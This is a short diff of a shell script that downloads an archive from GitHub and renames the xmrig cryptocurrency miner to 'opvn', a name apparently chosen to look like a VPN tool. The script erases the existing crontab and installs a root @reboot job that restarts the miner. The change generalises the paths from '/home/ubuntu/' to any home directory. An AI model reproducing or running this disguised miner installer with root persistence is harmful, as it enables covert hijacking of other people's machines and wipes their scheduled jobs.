@@ -1,4 +1,4 @@
-cd /home/ubuntu/
+cd /home/*/
 wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
 tar -xzsf opme.tar.gz
 mv xmrig* opvn
@@ -30,7 +30,7 @@ chmod +x reboot.sh
 
 crontab -r
 #DO only
-(crontab -u root -l; echo "@reboot cd /home/ubuntu/opvn && ./cronjob.sh" ) | crontab -u root -
+(crontab -u root -l; echo "@reboot cd /home/*/opvn && ./cronjob.sh" ) | crontab -u root -
 
 # this cron for aws but not use
 #(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && ./cronjob.sh" ) | crontab -u ubuntu -
